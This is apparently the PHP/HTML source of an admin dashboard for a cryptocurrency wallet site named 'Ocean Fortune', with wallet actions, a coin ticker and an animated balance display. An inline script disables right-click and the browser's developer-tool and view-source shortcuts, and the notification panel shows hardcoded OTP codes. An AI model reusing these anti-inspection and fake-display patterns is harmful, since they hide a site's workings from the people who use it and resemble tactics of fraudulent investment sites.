<?php

ini_set('session.cookie_lifetime', 0);
ini_set('session.gc_maxlifetime', 0);
session_start();

if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit();
}

$user_lname = $_SESSION['user_lastname'] ;
$email = $_SESSION['user_email'] ;


if (!isset($_SESSION['notifications'])) {
  $_SESSION['notifications'] = [];
}

function addLoginNotification($userName) {
  $message = "Login successful for user: " . htmlspecialchars($userName);
  $_SESSION['notifications'][] = $message;
}

addLoginNotification($user_lname);  

// Display notifications
?>

?>

<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
      <!-- ============TITLE============= -->
      <title>Ocean Fortune</title>
  
      <!-- ============HEAD-ICON-LOGO============= -->
      <link rel="icon" type="image/png" href="assets/images/logo.png">
  
      <!-- ============CSS-LINKS============= -->
      <link rel="stylesheet" href="assets/css/main.css">
      <link rel="stylesheet" href="assets/css/style.css">
      <link rel="stylesheet" href="assets/css/table-wallet.css">
      <link rel="stylesheet" href="assets/css/mediaquery.css">
      <link rel="stylesheet" href="assets/css/main-mediaquery.css">
      <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/5.4.5/css/swiper.css">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.2.0/remixicon.min.css">
      <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
  
  
  
      <!-- ============FONT-AWESOME-LINKS============= -->
      <link rel="stylesheet" href="assets/font-awesome/css/font-awesome.min.css">
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

  

      <noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
  </head>
    
    <style>
      html{
        animation: none;
      }

    </style>
<body>
    
      <header class="dashboard_header">
          <div class="wrapper">
            <div class="logo">
              <div class="image_wrapper">
                  <img src="assets/images/logo.png" width="42" height="42" alt="">
              </div>
            </div>
            
            <div class="icons">
              <ul>
                <h4 style="color: white;"><?php echo htmlspecialchars($user_lname); ?>
                  <span class="login-status"></span>
                </h4>
                  <li class=""><a href="#"><i class="material-icons notification-icon">notifications_none</i></a>
                      <div class="notification_box">
                        <div class="wrapper">
                          <header>
                              <span>Notifications</span>
                              <a href="#">Clear All</a>
                          </header>
                          <ul>
                              <li>
                                  <a href="#">
                                      <i class="fa fa-user"></i>
                                      <span>Your OTP is <p>487887</p></span>
                                  </a>
                              </li>

                              <li>
                                  <a href="#">
                                      <i class="fa fa-user"></i>
                                      <span>Your OTP is <p>651902</p></span>
                                  </a>
                              </li>

                              <li>
                                  <a href="#">
                                      <i class="fa fa-user"></i>
                                      <span>Your OTP is <p>651902</p></span>
                                  </a>
                              </li>

                              <li>
                                  <a href="#">
                                      <i class="fa fa-user"></i>
                                      <span>Your OTP is <p>651902</p></span>
                                  </a>
                              </li>
                          </ul>
                          <div class="view_all"><a href="#">View All</a></div>
                        </div>
                      </div>
                  </li>

                  <li><a><i class="material-icons account-icon">account_circle</i></a>
                      <div class="profile_box">
                          <ul>
                              <li>
                                  <a href="admin_profile.php">
                                      <i class="material-icons">person_outline</i>
                                      <span>Profile </span>
                                  </a>
                              </li>
                              <li>
                                  <a href="admin_wallet_page.php">
                                      <i class="material-icons">account_balance_wallet</i>
                                      <span>Wallet</span>
                                  </a>
                              </li>
                              <li>
                                  <a href="logout.php">
                                      <i class="material-icons">logout</i>
                                      <span>Logout</span>
                                  </a>
                              </li>
                          </ul>
                      </div>

                      
                  </li>

                
              </ul>
            </div>
          </div>


        <!-- ============ CRYPTO STICKER ============= //--AT THE TOP, BELOW THE NAV BAR--//-->
        <div class="crypto-ticker">
          <div style="height:62px; background-color: #1e293b; overflow:hidden; box-sizing: border-box; border: 1px solid #282E3B; border-radius: 4px; text-align: right; line-height:14px; block-size:62px; font-size: 12px; font-feature-settings: normal; text-size-adjust: 100%; box-shadow: inset 0 -20px 0 0 #262B38;padding:1px;padding: 0px; margin: 0px; width: 100%;">
              <div style="height:40px; padding:0px; margin:0px; width: 100%;">
                  <iframe src="https://widget.coinlib.io/widget?type=horizontal_v2&amp;theme=dark&amp;pref_coin_id=1505&amp;invert_hover=no" width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;"></iframe>
                  <script>
                      document.addEventListener('contextmenu', (event) => event.preventDefault());
                          document.onkeydown = function(e) {
                              // Disable F12, Ctrl+Shift+I (Inspector), Ctrl+Shift+J (Console), Ctrl+U (View Source)
                              if (e.keyCode == 123 || // F12
                                  (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
                                  (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) || // Ctrl+Shift+J
                                  (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) { // Ctrl+U
                                  return false; // Prevent the event
                              }
                          };
                  </script>
              </div>
              <div style="color: #1e293b; line-height: 14px; font-weight: 400; font-size: 11px; box-sizing: border-box; padding: 2px 6px; width: 100%; font-family: Verdana, Tahoma, Arial, sans-serif;">
                  <a href="https://coinlib.io" target="_blank" style="font-weight: 500; color: #626B7F; text-decoration:none; font-size:11px"></a>
              </div>
          </div>
        </div>
      </header>
            

        <?php
        
             include 'dashboard_logic.php'             
        
        ?>

    
        
            
      <aside class="sidebar">
          <div class="wrapper">


              <div class="sidebar_menu">
                  <ul>
                      <li>
                          <a href="admin_dashboard.php">
                              <i class="material-icons">dashboard</i>
                              <span>Home</span>
                          </a>
                      </li>
                      <li>
                          <a href="admin_swap.php">
                              <i class="material-icons">swap_calls</i>
                              <span>Swap</span>
                          </a>
                      </li>

                      <li>
                          <a href="users.php">
                              <i class="fa fa-user-o"></i>
                              <span>Users</span>
                          </a>
                      </li>

                      <li>
                          <a href="admin_history.php">
                              <i class="material-icons">history</i>
                              <span>History</span>
                          </a>
                      </li>
                      <li>
                          <a href="features.php">
                              <i class="material-icons">widgets</i>
                              <span>Features</span>
                          </a>
                      </li>
                      <li>
                          <a href="market.php">
                              <i class="material-icons">store</i>
                              <span>Market</span>
                          </a>
                      </li>
                  </ul>
              </div>

              <div class="sidebar_widgets">
                <div class="wrapper">
                  <div class="image">
                    <img src="assets/images/crypto-join.png" alt="">
                  </div>
                  <div class="text">
                    <h3>Invest Now!</h3>
                    <a href="">
                      Buy and Sell Coins
                    </a>
                    <br><br>
                  </div>
                </div>
              </div>
          </div>
      </aside>

      <main class="main_content">
          <div class="wrapper">
              <section class="quick_actions_section">
                <div class="wrapper">

                  <div class="users_balance_section">
                      <div>
                          <span>Wallet <i class="material-icons">keyboard_arrow_down</i></span>
                          <span id="amount" class="user-balance scramble-text">$<?php echo number_format($balance, 2); ?></span>

                          <script>
                            function scrambleText(element, originalText, steps, interval) {
                              const characters = '0123456789$,.'; // Characters used for scrambling
                              let scrambled = originalText.split('');
                              
                              let step = 0;
                              const scrambleInterval = setInterval(() => {
                                step++;
                                scrambled = scrambled.map((char, i) => 
                                  Math.random() < 0.5 && step < steps ? characters.charAt(Math.floor(Math.random() * characters.length)) : originalText[i]
                                );
                                element.textContent = scrambled.join('');
                        
                                if (step >= steps) {
                                  clearInterval(scrambleInterval);
                                  element.textContent = originalText; // Restore original text
                                }
                              }, interval);
                            }
                        
                            const span = document.querySelector('#amount');
                            const originalText = '$<?php echo number_format($balance, 2); ?>';
                        
                            // Run the animation once on page load
                            scrambleText(span, originalText, 15, 100); // 15 steps, 100ms per step
                        
                            // Call the scrambleText function every 4 seconds after the initial run
                            setInterval(() => {
                              scrambleText(span, originalText, 15, 100);
                            }, 4000); // 4 seconds interval
                          </script>
                        </body>
                      </div>
                  </div>

                  <div class="action_cards">
                      <div class="wrapper">
                          <div class="card">
                              <a href="admin_send.php">
                                  <span><i class="material-icons">arrow_upward</i></span>
                                  <span>Send</span>
                              </a>
                          </div>
                          <div class="card">
                              <a href="admin_deposit.php">
                                  <span><i class="material-icons">arrow_downward</i></span>
                                  <span>Deposit</span>
                              </a>
                          </div>
                          <div class="card">
                              <a href="admin_sell.php">
                                  <span><i class="material-icons">sell</i></span>
                                  <span>Sell</span>
                              </a>
                          </div>
                          <div class="card">
                              <a href="admin_swap.php">
                                  <span><i class="material-icons">swap_calls</i></span>
                                  <span>Swap</span>
                              </a>
                          </div>
                          <div class="card">
                               <a href="users.php">
                                    <i class="fa fa-user-o"></i>
                                    <span>Users</span>
                               </a>
                          </div>
                          <div class="card">
                              <a href="admin_history.php">
                                  <span><i class="material-icons">history</i></span>
                                  <span>History</span>
                              </a>
                          </div>
                      </div>
                  </div>

                  <div class="quick_actions_minimized">
                    <div class="wrapper">
                      <ul>
                          <li>
                              <a href="admin_send.php">
                                <span><i class="material-icons">arrow_upward</i></span>
                                <span>Send</span>
                              </a>
                          </li>
                      </ul>
          
                      <ul>
                          <li>
                              <a href="admin_dashboard.php">
                                <span><i class="material-icons">arrow_downward</i></span>
                                <span>Deposit</span>
                              </a>
                          </li>
                      </ul>
          
                      <ul>
                          <li>
                              <a href="admin_sell.php">
                                <span><i class="material-icons">sell</i></span>
                                <span>Sell</span>
                              </a>
                          </li>
                      </ul>
          
                      <ul>
                          <li>
                              <a href="admin_swap.php">
                                  <span><i class="material-icons">swap_calls</i></span>
                                  <span>Swap</span>
                              </a>
                          </li>
                      </ul>
          
                      <ul>
                          <li>
                              <a href="admin_history.php">
                                  <i class="material-icons">history</i>
                                  <span>History</span>
                              </a>
                          </li>
                      </ul>
                    </div>
                  </div>

                </div>
              </section>
            <?php
                
                include 'wallet.php';

            ?>

              
            </div>    

       </main>
      

      
      
       <footer class="dashboard_footer">
        <div class="wrapper">
          <span>© 2024 <a href="index.php">Creative Fortune</a>All Right Reserved</span>
          <span><a href="#">Purchase Now</a></span>
        </div>
      </footer>

      <section class="bottom_nav">
        <div class="wrapper">
            <ul>
                <li>
                    <a href="admin_dashboard.php">
                        <i class="material-icons">dashboard</i>
                        <span>Home</span>
                    </a>
                </li>
            </ul>

            <ul>
                <li>
                    <a href="admin_swap.php">
                        <i class="material-icons">swap_calls</i>
                        <span>Swap</span>
                    </a>
                </li>
            </ul>
            
            <ul>
                <li>
                    <a href="users.php">
                        <i class="fa fa-user-o"></i>
                        <span>Users</span>
                    </a>
                </li>
            </ul>
            

            <ul>
                <li>
                    <a href="admin_history.php">
                        <i class="material-icons">history</i>
                        <span>History</span>
                    </a>
                </li>
            </ul>

            <ul>
                <li>
                    <a href="features.php">
                        <i class="material-icons">widgets</i>
                        <span>Features</span>
                    </a>
                </li>
            </ul>

            <ul>
                <li>
                    <a href="market.php">
                        <i class="material-icons">store</i>
                        <span>Market</span>
                    </a>
                </li>
            </ul>
        </div>
      </section>



    <!-- ============JAVASCRIPT-LINKS============= -->
    <script src="assets/user/javascript/popup.js"></script>
    <script src="assets/user/javascript/function.js"></script>



